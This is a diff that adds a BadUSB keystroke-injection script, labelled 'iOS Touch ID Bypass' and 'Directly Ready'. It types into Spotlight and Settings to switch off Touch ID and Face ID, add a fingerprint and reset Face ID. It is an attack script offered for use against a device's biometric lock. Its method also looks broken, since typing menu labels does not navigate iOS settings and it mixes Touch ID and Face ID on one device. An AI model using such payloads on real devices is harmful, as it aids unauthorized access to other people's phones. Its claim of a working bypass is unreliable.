@@ -1,0 +1,50 @@
+REM Title: iOS Touch ID Bypass
+REM Author: BadUSB Library
+REM Description: Attempts to bypass Touch ID
+REM Target: iOS 14.0+
+REM Category: Authentication
+REM Type: Directly Ready
+
+REM Try to access Touch ID settings
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Settings
+ENTER
+DELAY 3000
+
+STRING Touch ID & Passcode
+ENTER
+DELAY 2000
+
+REM Try to disable Touch ID
+STRING Touch ID
+ENTER
+DELAY 2000
+
+STRING Turn Off Touch ID
+ENTER
+DELAY 2000
+
+REM Try to add new fingerprint
+STRING Add a Fingerprint
+ENTER
+DELAY 2000
+
+REM Try to access Face ID
+STRING Face ID & Passcode
+ENTER
+DELAY 2000
+
+STRING Face ID
+ENTER
+DELAY 2000
+
+STRING Turn Off Face ID
+ENTER
+DELAY 2000
+
+REM Try to reset Face ID
+STRING Reset Face ID
+ENTER
+DELAY 2000
